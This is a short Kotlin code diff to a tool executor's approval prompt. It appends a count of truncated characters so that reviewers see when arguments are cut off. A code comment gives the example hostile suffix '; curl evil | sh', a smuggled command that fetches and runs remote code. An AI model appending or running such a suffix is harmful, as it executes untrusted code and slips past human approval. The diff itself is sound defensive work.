@@ -147,7 +147,14 @@ class ToolExecutor(
             toolId = name,
             toolName = toolName,
             reason = reason,
-            detail = arguments.take(MAX_APPROVAL_DETAIL_LENGTH),
+            // Never show a bare prefix: a hidden suffix (e.g. `; curl evil | sh`)
+            // would be approved unseen, so say how much was cut.
+            detail = if (arguments.length > MAX_APPROVAL_DETAIL_LENGTH) {
+                arguments.take(MAX_APPROVAL_DETAIL_LENGTH) +
+                    "… (+${arguments.length - MAX_APPROVAL_DETAIL_LENGTH} more chars not shown)"
+            } else {
+                arguments
+            },
         )
     }
 
